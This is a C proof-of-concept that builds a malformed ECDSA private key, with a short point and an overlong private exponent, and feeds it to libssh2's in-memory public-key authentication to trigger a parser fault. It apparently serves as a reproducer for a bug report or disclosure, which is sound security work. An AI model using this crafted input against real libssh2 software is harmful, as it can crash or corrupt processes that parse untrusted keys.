/*
 * PoC: crafted openssh-key-v1 ECDSA private key passed to
 * libssh2_userauth_publickey_frommemory().
 *
 * The private key section carries a short public point string and a much
 * longer private exponent mpint. No network I/O is needed; the fault
 * happens while the key is parsed.
 */
#include "keybuilder.h"
#include "libssh2.h"

int main(void)
{
    LIBSSH2_SESSION *session;
    struct kbuf pem = { NULL, 0, 0 };
    unsigned char pub_point[65];
    unsigned char point[1];
    unsigned char exponent[64];
    int rc;

    /* uncompressed EC point in the embedded public key blob */
    pub_point[0] = 0x04;
    memset(pub_point + 1, 0x42, sizeof(pub_point) - 1);

    /* short point in the private key section */
    point[0] = 0x04;

    /* longer private exponent */
    memset(exponent, 0xa5, sizeof(exponent));

    kb_build_ecdsa_key(&pem, pub_point, sizeof(pub_point),
                       point, sizeof(point), exponent, sizeof(exponent));

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 1;
    }

    rc = libssh2_userauth_publickey_frommemory(session, "libssh2", 7,
                                               NULL, 0,
                                               (const char *)pem.data,
                                               pem.len, NULL);
    printf("libssh2_userauth_publickey_frommemory returned %d\n", rc);

    libssh2_session_free(session);
    libssh2_exit();
    free(pem.data);
    return 0;
}
